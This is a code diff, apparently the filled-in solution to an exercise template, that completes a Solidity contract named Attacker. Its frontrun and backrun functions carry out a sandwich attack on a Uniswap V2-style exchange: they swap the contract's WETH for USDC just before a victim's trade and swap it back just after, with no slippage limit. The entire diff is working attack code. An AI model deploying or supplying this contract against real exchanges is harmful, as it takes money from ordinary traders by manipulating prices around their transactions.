@@ -16,12 +16,32 @@ import "./interfaces/IERC20.sol";
 contract Attacker {
     // This function will be called before the victim's transaction.
     function frontrun(address router, address weth, address usdc, uint256 deadline) public {
-        // your code here
+        // Get the amount of WETH in the contract.
+        uint256 amountWETHIn = IERC20(weth).balanceOf(address(this));
+        // Create a path array with the addresses of the tokens to swap.
+        // In this case, we are swapping WETH for USDC.
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+        // Approve the router to spend the WETH.
+        IERC20(weth).approve(router, amountWETHIn);
+        // Swap the WETH for USDC without slippage protection.
+        IUniswapV2Router(router).swapExactTokensForTokens(amountWETHIn, 0, path, address(this), deadline);
     }
 
     // This function will be called after the victim's transaction.
     function backrun(address router, address weth, address usdc, uint256 deadline) public {
-        // your code here
+        // Get the amount of USDC in the contract.
+        uint256 amountUSDCIn = IERC20(usdc).balanceOf(address(this));
+        // Create a path array with the addresses of the tokens to swap.
+        // In this case, we are swapping USDC for WETH.
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+        // Approve the router to spend the USDC.
+        IERC20(usdc).approve(router, amountUSDCIn);
+        // Swap the USDC for WETH without slippage protection.
+        IUniswapV2Router(router).swapExactTokensForTokens(amountUSDCIn, 0, path, address(this), deadline);
     }
 }
 
